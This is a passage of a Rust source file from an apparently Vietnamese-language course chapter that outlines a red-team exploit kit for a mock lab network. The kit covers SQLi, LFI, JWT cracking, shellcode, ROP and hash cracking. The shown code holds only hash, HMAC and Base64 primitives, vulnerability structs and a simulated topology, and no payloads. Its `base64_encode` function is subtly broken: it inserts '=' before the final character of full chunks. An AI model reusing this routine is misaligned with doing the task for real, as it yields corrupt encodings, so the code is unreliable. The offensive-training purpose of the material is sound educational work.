//! # Chương 104: Đại dự án Tích hợp I — Bộ Công cụ Red Team Khai Thác Toàn Diện End-to-End kèm Chứng minh Khai thác (Red Team Exploit Kit with Proof-by-Exploitation)
//!
//! Crate `code/ch104` là đỉnh cao tích hợp khép kín của **Chủ đề 28** (An ninh Ứng dụng,
//! Khai thác & Đội đỏ) trong toàn bộ giáo trình `learn-rs`.
//!
//! Toàn bộ crate được viết bằng 100% Rust 2024 thuần `std`, không có bất kỳ phụ thuộc
//! bên ngoài nào (`[dependencies]` rỗng tuyệt đối). Vì mỗi chương là một crate độc lập,
//! crate này **tái tạo (mirror)** toàn bộ cấu trúc cốt lõi từ Chương 98 (Khai thác nhị phân),
//! Chương 99 (Thâm nhập mạng), Chương 100 (Khai thác web), Chương 101 (Tấn công xác thực),
//! Chương 102 (Leo thang đặc quyền) và Chương 103 (Xoay chiều mạng) để dựng nên một
//! **bộ công cụ Red Team khép kín**:
//!
//! - `ReconEngine` — quét cổng, nhận dạng dịch vụ và lập bản đồ mạng.
//! - `WebExploitEngine` — SQLi mù, LFI, vượt kiểm duyệt tải lên và bẻ khoá JWT.
//! - `BinaryExploitEngine` — mẫu tuần hoàn (De Bruijn), mã hoá XOR shellcode và chuỗi ROP.
//! - `CredentialAttackEngine` — MD4/MD5/SHA-256 tự cài, bẻ NT hash và biến thể từ điển.
//! - `PrivEscEngine` — SUID/sudo/cron/capabilities cùng `GroundTruthVerifier` chống lời khai giả.
//! - `PivotEngine` — đường hầm SSH, chuỗi SOCKS relay và đường đi xoay chiều.
//! - `StaticVulnScanner` — quét heuristic mã nguồn theo ≥ 10 luật CWE (lấy cảm hứng từ `vulnhuntr`).
//! - `VulnDatabase` — ≥ 50 lỗ hổng OSCP phổ biến kèm khung khai thác.
//! - `ProofByExploitation` — xương sống của hệ thống: **chỉ giữ phát hiện khi PoC chạy được**,
//!   bảo đảm `false_positive_rate == 0.0` (lấy cảm hứng từ `Strix`).
//! - `PentestReportGenerator` — sinh báo cáo Markdown theo chuẩn OSCP.
//!
//! **Lưu ý đạo đức**: mọi khai thác trong crate này chỉ chạy trên dữ liệu tổng hợp tất định
//! (`MockNetwork`, `MockFilesystem`, `MockShell`, `MockDatabase`) hoặc trên bộ đệm nhị phân
//! do chính crate tạo ra. Không có kết nối nào tới hệ thống thật ngoài loopback.

#![allow(dead_code)]

use std::collections::{HashMap, HashSet};
use std::fmt::Write as _;
use std::fs;
use std::net::{Ipv4Addr, SocketAddr};
use std::path::PathBuf;

// ============================================================================
// 1. HẠT NHÂN MÃ BĂM, MÃ HOÁ & NGẪU NHIÊN TẤT ĐỊNH
// ============================================================================

/// Bảng hằng số SHA-256 theo chuẩn FIPS 180-4.
const SHA256_K: [u32; 64] = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
];

/// Bảng hằng số MD5 theo chuẩn RFC 1321.
const MD5_T: [u32; 64] = [
    0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee, 0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
    0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be, 0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,
    0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa, 0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
    0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed, 0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,
    0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c, 0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
    0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05, 0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,
    0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039, 0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
    0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1, 0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391,
];

/// Bảng hằng số dịch chuyển MD5 theo chuẩn RFC 1321.
const MD5_S: [u32; 64] = [
    7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9,
    14, 20, 5, 9, 14, 20, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 6, 10, 15,
    21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21,
];

/// Bảng chữ cái Base64 chuẩn (RFC 4648).
const B64_STANDARD: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/// Bảng chữ cái Base64URL chuẩn (RFC 7515 — JSON Web Signature).
const B64_URL: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

/// Chuyển một mảng byte thành chuỗi hex viết thường.
pub fn to_hex(bytes: &[u8]) -> String {
    let mut out = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        let _ = write!(out, "{b:02x}");
    }
    out
}

/// Chuyển một chuỗi hex thành mảng byte (trả `None` nếu chuỗi lẻ hoặc sai ký tự).
pub fn from_hex(hex: &str) -> Option<Vec<u8>> {
    if !hex.len().is_multiple_of(2) {
        return None;
    }
    let mut out = Vec::with_capacity(hex.len() / 2);
    let bytes = hex.as_bytes();
    for pair in bytes.chunks(2) {
        let s = std::str::from_utf8(pair).ok()?;
        out.push(u8::from_str_radix(s, 16).ok()?);
    }
    Some(out)
}

/// Tính giá trị băm SHA-256 chuẩn FIPS 180-4 bằng 100% Rust thuần `std`.
pub fn sha256(data: &[u8]) -> [u8; 32] {
    let mut h: [u32; 8] = [
        0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab,
        0x5be0cd19,
    ];

    let bit_len = (data.len() as u64).wrapping_mul(8);
    let mut padded = data.to_vec();
    padded.push(0x80);
    while padded.len() % 64 != 56 {
        padded.push(0x00);
    }
    padded.extend_from_slice(&bit_len.to_be_bytes());

    for chunk in padded.chunks(64) {
        let mut w = [0u32; 64];
        for (i, word) in w.iter_mut().take(16).enumerate() {
            *word = u32::from_be_bytes([
                chunk[i * 4],
                chunk[i * 4 + 1],
                chunk[i * 4 + 2],
                chunk[i * 4 + 3],
            ]);
        }
        for i in 16..64 {
            let s0 = w[i - 15].rotate_right(7) ^ w[i - 15].rotate_right(18) ^ (w[i - 15] >> 3);
            let s1 = w[i - 2].rotate_right(17) ^ w[i - 2].rotate_right(19) ^ (w[i - 2] >> 10);
            w[i] = w[i - 16]
                .wrapping_add(s0)
                .wrapping_add(w[i - 7])
                .wrapping_add(s1);
        }

        let mut a = h[0];
        let mut b = h[1];
        let mut c = h[2];
        let mut d = h[3];
        let mut e = h[4];
        let mut f = h[5];
        let mut g = h[6];
        let mut hh = h[7];

        for i in 0..64 {
            let s1 = e.rotate_right(6) ^ e.rotate_right(11) ^ e.rotate_right(25);
            let ch = (e & f) ^ ((!e) & g);
            let temp1 = hh
                .wrapping_add(s1)
                .wrapping_add(ch)
                .wrapping_add(SHA256_K[i])
                .wrapping_add(w[i]);
            let s0 = a.rotate_right(2) ^ a.rotate_right(13) ^ a.rotate_right(22);
            let maj = (a & b) ^ (a & c) ^ (b & c);
            let temp2 = s0.wrapping_add(maj);
            hh = g;
            g = f;
            f = e;
            e = d.wrapping_add(temp1);
            d = c;
            c = b;
            b = a;
            a = temp1.wrapping_add(temp2);
        }

        h[0] = h[0].wrapping_add(a);
        h[1] = h[1].wrapping_add(b);
        h[2] = h[2].wrapping_add(c);
        h[3] = h[3].wrapping_add(d);
        h[4] = h[4].wrapping_add(e);
        h[5] = h[5].wrapping_add(f);
        h[6] = h[6].wrapping_add(g);
        h[7] = h[7].wrapping_add(hh);
    }

    let mut out = [0u8; 32];
    for (i, word) in h.iter().enumerate() {
        out[i * 4..i * 4 + 4].copy_from_slice(&word.to_be_bytes());
    }
    out
}

/// Tính giá trị băm MD5 chuẩn RFC 1321.
pub fn md5(data: &[u8]) -> [u8; 16] {
    let mut msg = data.to_vec();
    let bit_len = (data.len() as u64).wrapping_mul(8);
    msg.push(0x80);
    while msg.len() % 64 != 56 {
        msg.push(0x00);
    }
    msg.extend_from_slice(&bit_len.to_le_bytes());

    let (mut a, mut b, mut c, mut d) = (0x67452301u32, 0xefcdab89u32, 0x98badcfeu32, 0x10325476u32);

    for chunk in msg.chunks(64) {
        let mut m = [0u32; 16];
        for (i, word) in m.iter_mut().enumerate() {
            *word = u32::from_le_bytes([
                chunk[i * 4],
                chunk[i * 4 + 1],
                chunk[i * 4 + 2],
                chunk[i * 4 + 3],
            ]);
        }

        let (mut aa, mut bb, mut cc, mut dd) = (a, b, c, d);
        for i in 0..64 {
            let (f, g) = match i {
                0..=15 => ((bb & cc) | (!bb & dd), i),
                16..=31 => ((dd & bb) | (!dd & cc), (5 * i + 1) % 16),
                32..=47 => (bb ^ cc ^ dd, (3 * i + 5) % 16),
                _ => (cc ^ (bb | !dd), (7 * i) % 16),
            };
            let temp = dd;
            dd = cc;
            cc = bb;
            let sum = aa.wrapping_add(f).wrapping_add(MD5_T[i]).wrapping_add(m[g]);
            bb = bb.wrapping_add(sum.rotate_left(MD5_S[i]));
            aa = temp;
        }

        a = a.wrapping_add(aa);
        b = b.wrapping_add(bb);
        c = c.wrapping_add(cc);
        d = d.wrapping_add(dd);
    }

    let mut out = [0u8; 16];
    out[0..4].copy_from_slice(&a.to_le_bytes());
    out[4..8].copy_from_slice(&b.to_le_bytes());
    out[8..12].copy_from_slice(&c.to_le_bytes());
    out[12..16].copy_from_slice(&d.to_le_bytes());
    out
}

/// Tính giá trị băm MD4 chuẩn RFC 1320 (nền tảng của giao thức NTLM).
pub fn md4(data: &[u8]) -> [u8; 16] {
    let mut msg = data.to_vec();
    let bit_len = (data.len() as u64).wrapping_mul(8);
    msg.push(0x80);
    while msg.len() % 64 != 56 {
        msg.push(0x00);
    }
    msg.extend_from_slice(&bit_len.to_le_bytes());

    let (mut a, mut b, mut c, mut d) = (0x67452301u32, 0xefcdab89u32, 0x98badcfeu32, 0x10325476u32);

    for chunk in msg.chunks(64) {
        let mut x = [0u32; 16];
        for (i, word) in x.iter_mut().enumerate() {
            *word = u32::from_le_bytes([
                chunk[i * 4],
                chunk[i * 4 + 1],
                chunk[i * 4 + 2],
                chunk[i * 4 + 3],
            ]);
        }

        let (mut aa, mut bb, mut cc, mut dd) = (a, b, c, d);

        // Vòng 1 — hàm F theo RFC 1320: F(X,Y,Z) = (X AND Y) OR (NOT X AND Z).
        for i in (0..16).step_by(4) {
            let f = |x: u32, y: u32, z: u32| (x & y) | (!x & z);
            aa = aa
                .wrapping_add(f(bb, cc, dd))
                .wrapping_add(x[i])
                .rotate_left(3);
            dd = dd
                .wrapping_add(f(aa, bb, cc))
                .wrapping_add(x[i + 1])
                .rotate_left(7);
            cc = cc
                .wrapping_add(f(dd, aa, bb))
                .wrapping_add(x[i + 2])
                .rotate_left(11);
            bb = bb
                .wrapping_add(f(cc, dd, aa))
                .wrapping_add(x[i + 3])
                .rotate_left(19);
        }

        // Vòng 2 — hàm G.
        for i in 0..4 {
            let g = |x: u32, y: u32, z: u32| (x & y) | (x & z) | (y & z);
            aa = aa
                .wrapping_add(g(bb, cc, dd))
                .wrapping_add(x[i])
                .wrapping_add(0x5A82_7999)
                .rotate_left(3);
            dd = dd
                .wrapping_add(g(aa, bb, cc))
                .wrapping_add(x[i + 4])
                .wrapping_add(0x5A82_7999)
                .rotate_left(5);
            cc = cc
                .wrapping_add(g(dd, aa, bb))
                .wrapping_add(x[i + 8])
                .wrapping_add(0x5A82_7999)
                .rotate_left(9);
            bb = bb
                .wrapping_add(g(cc, dd, aa))
                .wrapping_add(x[i + 12])
                .wrapping_add(0x5A82_7999)
                .rotate_left(13);
        }

        // Vòng 3 — hàm H, thứ tự chỉ số X theo RFC 1320: (0,8,4,12), (2,10,6,14), (1,9,5,13), (3,11,7,15).
        const ROUND3_ORDER: [(usize, usize, usize, usize); 4] =
            [(0, 8, 4, 12), (2, 10, 6, 14), (1, 9, 5, 13), (3, 11, 7, 15)];
        for (i, j, k, l) in ROUND3_ORDER {
            let h = |x: u32, y: u32, z: u32| x ^ y ^ z;
            aa = aa
                .wrapping_add(h(bb, cc, dd))
                .wrapping_add(x[i])
                .wrapping_add(0x6ED9_EBA1)
                .rotate_left(3);
            dd = dd
                .wrapping_add(h(aa, bb, cc))
                .wrapping_add(x[j])
                .wrapping_add(0x6ED9_EBA1)
                .rotate_left(9);
            cc = cc
                .wrapping_add(h(dd, aa, bb))
                .wrapping_add(x[k])
                .wrapping_add(0x6ED9_EBA1)
                .rotate_left(11);
            bb = bb
                .wrapping_add(h(cc, dd, aa))
                .wrapping_add(x[l])
                .wrapping_add(0x6ED9_EBA1)
                .rotate_left(15);
        }

        a = a.wrapping_add(aa);
        b = b.wrapping_add(bb);
        c = c.wrapping_add(cc);
        d = d.wrapping_add(dd);
    }

    let mut out = [0u8; 16];
    out[0..4].copy_from_slice(&a.to_le_bytes());
    out[4..8].copy_from_slice(&b.to_le_bytes());
    out[8..12].copy_from_slice(&c.to_le_bytes());
    out[12..16].copy_from_slice(&d.to_le_bytes());
    out
}

/// Tính HMAC-SHA256 theo RFC 2104.
pub fn hmac_sha256(key: &[u8], msg: &[u8]) -> [u8; 32] {
    let mut block = [0u8; 64];
    if key.len() > 64 {
        block[..32].copy_from_slice(&sha256(key));
    } else {
        block[..key.len()].copy_from_slice(key);
    }

    let mut ipad = [0x36u8; 64];
    let mut opad = [0x5cu8; 64];
    for i in 0..64 {
        ipad[i] ^= block[i];
        opad[i] ^= block[i];
    }

    let mut inner = Vec::with_capacity(64 + msg.len());
    inner.extend_from_slice(&ipad);
    inner.extend_from_slice(msg);
    let inner_hash = sha256(&inner);

    let mut outer = Vec::with_capacity(96);
    outer.extend_from_slice(&opad);
    outer.extend_from_slice(&inner_hash);
    sha256(&outer)
}

/// Mã hoá Base64URL không đệm (biến thể dùng cho JWT).
pub fn encode_base64url(data: &[u8]) -> String {
    let mut out = String::with_capacity(data.len().div_ceil(3) * 4);
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = chunk.get(1).copied().unwrap_or(0) as u32;
        let b2 = chunk.get(2).copied().unwrap_or(0) as u32;
        let n = (b0 << 16) | (b1 << 8) | b2;
        out.push(B64_URL[((n >> 18) & 0x3F) as usize] as char);
        out.push(B64_URL[((n >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 {
            out.push(B64_URL[((n >> 6) & 0x3F) as usize] as char);
        }
        if chunk.len() > 2 {
            out.push(B64_URL[(n & 0x3F) as usize] as char);
        }
    }
    out
}

/// Mã hoá Base64 chuẩn có đệm (RFC 4648).
pub fn base64_encode(data: &[u8]) -> String {
    let mut out = String::with_capacity(data.len().div_ceil(3) * 4);
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = chunk.get(1).copied().unwrap_or(0) as u32;
        let b2 = chunk.get(2).copied().unwrap_or(0) as u32;
        let n = (b0 << 16) | (b1 << 8) | b2;
        out.push(B64_STANDARD[((n >> 18) & 0x3F) as usize] as char);
        out.push(B64_STANDARD[((n >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 {
            out.push(B64_STANDARD[((n >> 6) & 0x3F) as usize] as char);
            out.push('=');
        } else {
            out.push('=');
            out.push('=');
        }
        if chunk.len() > 2 {
            out.push(B64_STANDARD[(n & 0x3F) as usize] as char);
        }
    }
    out
}

/// Giải mã Base64URL (chấp nhận cả bảng chữ cái chuẩn và bỏ qua đệm).
pub fn decode_base64url(input: &str) -> Result<Vec<u8>, String> {
    let mut acc: u32 = 0;
    let mut bits: u32 = 0;
    let mut out = Vec::with_capacity(input.len() * 3 / 4);
    for ch in input.chars() {
        if ch == '=' {
            break;
        }
        let value = match ch {
            'A'..='Z' => ch as u32 - 'A' as u32,
            'a'..='z' => ch as u32 - 'a' as u32 + 26,
            '0'..='9' => ch as u32 - '0' as u32 + 52,
            '+' | '-' => 62,
            '/' | '_' => 63,
            _ => return Err(format!("Ký tự Base64URL không hợp lệ: {ch}")),
        };
        acc = (acc << 6) | value;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push(((acc >> bits) & 0xFF) as u8);
        }
    }
    Ok(out)
}

/// Giải mã Base64 chuẩn (tương thích ngược với `decode_base64url`).
pub fn base64_decode(input: &str) -> Result<Vec<u8>, String> {
    decode_base64url(input)
}

/// Bộ sinh số giả ngẫu nhiên 64-bit tất định `SplitMix64`.
///
/// Dùng để tạo jitter, thứ tự quét cổng và các giá trị "ngẫu nhiên" trong mô phỏng mà
/// vẫn giữ được tính tái lập hoàn toàn trên mọi kiến trúc CPU.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SplitMix64 {
    /// Trạng thái thanh ghi 64-bit nội bộ.
    pub state: u64,
}

impl SplitMix64 {
    /// Khởi tạo bộ sinh số với hạt giống cố định.
    pub const fn new(seed: u64) -> Self {
        Self { state: seed }
    }

    /// Sinh số nguyên không dấu 64-bit tiếp theo.
    pub fn next_u64(&mut self) -> u64 {
        self.state = self.state.wrapping_add(0x9E37_79B9_7F4A_7C15);
        let mut z = (self.state ^ (self.state >> 30)).wrapping_mul(0xBF58_476D_1CE4_E5B9);
        z = (z ^ (z >> 27)).wrapping_mul(0x94D0_49BB_1331_11EB);
        z ^ (z >> 31)
    }

    /// Sinh số thực dấu phẩy động trong khoảng `[0.0, 1.0)`.
    pub fn next_f64(&mut self) -> f64 {
        (self.next_u64() >> 11) as f64 * (1.0 / (1u64 << 53) as f64)
    }

    /// Sinh số nguyên trong khoảng `[0, bound)` (bound phải khác 0).
    pub fn next_below(&mut self, bound: u64) -> u64 {
        if bound == 0 {
            return 0;
        }
        self.next_u64() % bound
    }
}

impl Default for SplitMix64 {
    fn default() -> Self {
        Self::new(0x5EED_1234_ABCD_0001)
    }
}

// ============================================================================
// 2. LÝ THUYẾT LỖ HỔNG, MỨC ĐỘ & CHỨNG MINH KHAI THÁC
// ============================================================================

/// Mức độ nghiêm trọng của một lỗ hổng, xếp theo thứ tự tăng dần.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    /// Chỉ mang tính thông tin.
    Info,
    /// Rủi ro thấp.
    Low,
    /// Rủi ro trung bình.
    Medium,
    /// Rủi ro cao.
    High,
    /// Rủi ro nghiêm trọng.
    Critical,
}

impl Severity {
    /// Nhãn hiển thị tiếng Việt tương ứng.
    pub fn label(&self) -> &'static str {
        match self {
            Severity::Info => "Thông tin",
            Severity::Low => "Thấp",
            Severity::Medium => "Trung bình",
            Severity::High => "Cao",
            Severity::Critical => "Nghiêm trọng",
        }
    }

    /// Quy đổi điểm CVSS thành mức độ theo ngưỡng nghiệp vụ.
    pub fn from_cvss(cvss: f64) -> Severity {
        if cvss >= 9.0 {
            Severity::Critical
        } else if cvss >= 7.0 {
            Severity::High
        } else if cvss >= 4.0 {
            Severity::Medium
        } else if cvss > 0.0 {
            Severity::Low
        } else {
            Severity::Info
        }
    }
}

/// Mô tả một lỗ hổng đã được xác định trên một mục tiêu cụ thể.
#[derive(Debug, Clone, PartialEq)]
pub struct Vulnerability {
    /// Mã định danh duy nhất, ví dụ `VULN-001`.
    pub id: String,
    /// Tiêu đề ngắn gọn.
    pub title: String,
    /// Mã CWE, ví dụ `CWE-89`.
    pub cwe: String,
    /// Điểm CVSS (0.0 – 10.0).
    pub cvss: f64,
    /// Mức độ nghiêm trọng suy ra từ CVSS.
    pub severity: Severity,
    /// Địa chỉ IP của mục tiêu.
    pub target_ip: Ipv4Addr,
    /// Cổng dịch vụ của mục tiêu.
    pub target_port: u16,
    /// Mô tả chi tiết lỗ hổng.
    pub description: String,
    /// Khuyến nghị khắc phục.
    pub remediation: String,
}

/// Bằng chứng khai thác thực tế đi kèm một lỗ hổng.
#[derive(Debug, Clone, PartialEq)]
pub struct ExploitProof {
    /// Payload đã gửi tới mục tiêu.
    pub payload_used: String,
    /// Phản hồi nhận được từ mục tiêu.
    pub response_received: String,
    /// Cờ cho biết tác động đã được chứng minh hay chưa.
    pub impact_demonstrated: bool,
    /// Vân tay SHA-256 của cặp payload/phản hồi.
    pub proof_hash: String,
}

/// Bọc chứng minh khai thác kèm cờ xác minh — xương sống của cả hệ thống.
///
/// Bất biến cốt lõi: một phát hiện chỉ được giữ lại khi **Proof of Exploitation** chạy được
/// và thực sự tạo ra tác động. Nhờ vậy tỉ lệ báo động giả (`false_positive_rate`) luôn bằng 0.
#[derive(Debug, Clone, PartialEq)]
pub struct ProofByExploitation {
    /// Bằng chứng khai thác thô.
    pub proof: ExploitProof,
    /// Kết quả xác minh.
    pub verified: bool,
}

impl ProofByExploitation {
    /// Khởi tạo bằng chứng và tự tính vân tay SHA-256.
    pub fn new(payload_used: &str, response_received: &str, impact_demonstrated: bool) -> Self {
        let proof_hash = proof_fingerprint(payload_used, response_received);
        Self {
            proof: ExploitProof {
                payload_used: payload_used.to_string(),
                response_received: response_received.to_string(),
                impact_demonstrated,
                proof_hash,
            },
            verified: impact_demonstrated
                && !payload_used.trim().is_empty()
                && !response_received.trim().is_empty(),
        }
    }

    /// Kiểm tra lại tính hợp lệ của bằng chứng.
    pub fn verify(&self) -> bool {
        self.verified
            && self.proof.impact_demonstrated
            && !self.proof.payload_used.trim().is_empty()
            && !self.proof.response_received.trim().is_empty()
    }

    /// Trả về vân tay SHA-256 của bằng chứng.
    pub fn proof_hash(&self) -> String {
        self.proof.proof_hash.clone()
    }

    /// Mô tả ngắn gọn bằng chứng để đưa vào báo cáo.
    pub fn summary(&self) -> String {
        format!(
            "payload {} byte | phản hồi {} byte | tác động: {}",
            self.proof.payload_used.len(),
            self.proof.response_received.len(),
            if self.proof.impact_demonstrated {
                "đã chứng minh"
            } else {
                "chưa chứng minh"
            }
        )
    }
}

/// Tính vân tay SHA-256 của cặp payload/phản hồi.
pub fn proof_fingerprint(payload_used: &str, response_received: &str) -> String {
    let mut buf = Vec::new();
    buf.extend_from_slice(payload_used.as_bytes());
    buf.push(b'\n');
    buf.extend_from_slice(response_received.as_bytes());
    to_hex(&sha256(&buf))
}

// ============================================================================
// 3. HẠ TẦNG MÔ PHỎNG: MẠNG, MÁY CHỦ, DỊCH VỤ VÀ SHELL ẢO
// ============================================================================

/// Một dịch vụ đang mở trên máy chủ ảo.
#[derive(Debug, Clone, PartialEq)]
pub struct MockService {
    /// Cổng lắng nghe.
    pub port: u16,
    /// Tên dịch vụ.
    pub name: String,
    /// Banner trả về khi bắt tay.
    pub banner: Vec<u8>,
    /// Phiên bản được công bố.
    pub version: String,
}

/// Một máy chủ ảo trong mạng nội bộ của phòng lab.
#[derive(Debug, Clone, PartialEq)]
pub struct MockHost {
    /// Địa chỉ IPv4.
    pub ip: Ipv4Addr,
    /// Tên máy chủ.
    pub hostname: String,
    /// Mô tả hệ điều hành.
    pub os: String,
    /// Danh sách dịch vụ đang mở.
    pub services: Vec<MockService>,
    /// Danh mục lỗ hổng đã được "cài" sẵn trong phòng lab.
    pub vulnerabilities: Vec<Vulnerability>,
    /// Cờ cho biết máy chủ đã bị chiếm quyền hay chưa.
    pub is_pwned: bool,
    /// Quyền hạn hiện tại của kẻ tấn công trên máy này.
    pub privileges: String,
}

impl MockHost {
    /// Tạo máy chủ ảo mới với địa chỉ, tên và hệ điều hành cho trước.
    pub fn new(ip: Ipv4Addr, hostname: &str, os: &str) -> Self {
        Self {
            ip,
            hostname: hostname.to_string(),
            os: os.to_string(),
            services: Vec::new(),
            vulnerabilities: Vec::new(),
            is_pwned: false,
            privileges: "none".to_string(),
        }
    }

    /// Gắn thêm một dịch vụ đang mở.
    pub fn with_service(mut self, port: u16, name: &str, banner: &[u8], version: &str) -> Self {
        self.services.push(MockService {
            port,
            name: name.to_string(),
            banner: banner.to_vec(),
            version: version.to_string(),
        });
        self
    }

    /// Gắn thêm một lỗ hổng vào danh mục của máy chủ.
    pub fn with_vulnerability(mut self, vuln: Vulnerability) -> Self {
        self.vulnerabilities.push(vuln);
        self
    }

    /// Gắn thêm một danh sách lỗ hổng vào danh mục của máy chủ.
    pub fn with_vulnerabilities(mut self, specs: &[VulnSpec]) -> Self {
        for spec in specs {
            self.vulnerabilities.push(make_vuln(*spec));
        }
        self
    }
}

/// Toàn bộ mạng nội bộ mô phỏng của phòng lab.
#[derive(Debug, Clone, PartialEq)]
pub struct MockNetwork {
    /// Danh sách máy chủ.
    pub hosts: Vec<MockHost>,
    /// Các cạnh định tuyến `(từ, đến)`.
    pub topology: Vec<(Ipv4Addr, Ipv4Addr)>,
}

impl MockNetwork {
    /// Dựng topo chuẩn gồm 5 máy: web DMZ, DB nội bộ, AD DC, máy trạm và file server.
    pub fn standard_topology() -> Self {
        let mut net = MockNetwork {
            hosts: Vec::new(),
            topology: Vec::new(),
        };

        net.hosts.push(
            MockHost::new(
                Ipv4Addr::new(10, 10, 10, 5),
                "web01",
                "Linux 5.15 Ubuntu (nginx)",
            )
            .with_service(
                80,
                "http",
                b"HTTP/1.1 200 OK\r\nServer: nginx/1.18.0\r\n\r\n",
                "1.18.0",
            )
            .with_service(
                22,
                "ssh",
                b"SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5\r\n",
                "8.2p1",
            )
            .with_vulnerabilities(&WEB_VULNS),
        );

        net.hosts.push(
            MockHost::new(
                Ipv4Addr::new(10, 10, 20, 10),
                "db01",
                "Linux 5.15 Ubuntu (mysql)",
            )
            .with_service(3306, "mysql", b"\x0a5.7.33-log\x00", "5.7.33")
            .with_service(
                22,
                "ssh",
                b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4\r\n",
                "8.9p1",
            )
            .with_vulnerabilities(&DB_VULNS),
        );

        net.hosts.push(
            MockHost::new(Ipv4Addr::new(10, 10, 30, 10), "dc01", "Windows Server 2019")
                .with_service(389, "ldap", b"LDAP v3.0 mock-ldap", "3.0")
                .with_service(88, "kerberos", b"KRB5 Kerberos 5 mock", "5")
                .with_service(445, "smb", b"\xffSMBv2 mock-smb", "3.1.1")
                .with_vulnerabilities(&DC_VULNS),
        );

        net.hosts.push(
            MockHost::new(Ipv4Addr::new(10, 10, 40, 10), "ws01", "Windows 10 Pro")
                .with_service(445, "smb", b"\xffSMBv2 mock-smb", "3.1.1")
                .with_service(3389, "rdp", b" RDP mock-rdp ", "1.0"),
        );

        net.hosts.push(
            MockHost::new(Ipv4Addr::new(10, 10, 50, 10), "fs01", "Windows Server 2016")
                .with_service(445, "smb", b"\xffSMBv2 mock-smb", "3.1.1")
                .with_service(21, "ftp", b"220 MockFTPD 1.0 (custom daemon)\r\n", "1.0")
                .with_vulnerabilities(&FS_VULNS),
        );

        net.topology = vec![
            (Ipv4Addr::new(10, 10, 10, 5), Ipv4Addr::new(10, 10, 20, 10)),
            (Ipv4Addr::new(10, 10, 10, 5), Ipv4Addr::new(10, 10, 30, 10)),
            (Ipv4Addr::new(10, 10, 30, 10), Ipv4Addr::new(10, 10, 40, 10)),
            (Ipv4Addr::new(10, 10, 30, 10), Ipv4Addr::new(10, 10, 50, 10)),
            (Ipv4Addr::new(10, 10, 20, 10), Ipv4Addr::new(10, 10, 30, 10)),
        ];

        net
    }

    /// Tìm máy chủ theo địa chỉ IP.
    pub fn host_at(&self, ip: Ipv4Addr) -> Option<&MockHost> {
        self.hosts.iter().find(|h| h.ip == ip)
    }

    /// Tìm máy chủ đầu tiên thoả mãn điều kiện.
    pub fn find_host(&self, predicate: impl Fn(&MockHost) -> bool) -> Option<&MockHost> {
        self.hosts.iter().find(|h| predicate(h))
    }

    /// Tìm máy chủ theo địa chỉ IP để sửa đổi (mutable).
    pub fn host_mut(&mut self, ip: Ipv4Addr) -> Option<&mut MockHost> {
        self.hosts.iter_mut().find(|h| h.ip == ip)
    }

    /// Danh sách các IP có thể tiếp cận được từ một máy (bao gồm đường đi gián tiếp).
    pub fn reachable_from(&self, from: Ipv4Addr) -> Vec<Ipv4Addr> {
        let mut seen: Vec<Ipv4Addr> = Vec::new();
        let mut frontier = vec![from];
        while let Some(current) = frontier.pop() {
            for (src, dst) in &self.topology {
                if *src == current && !seen.contains(dst) && *dst != from {
                    seen.push(*dst);
                    frontier.push(*dst);
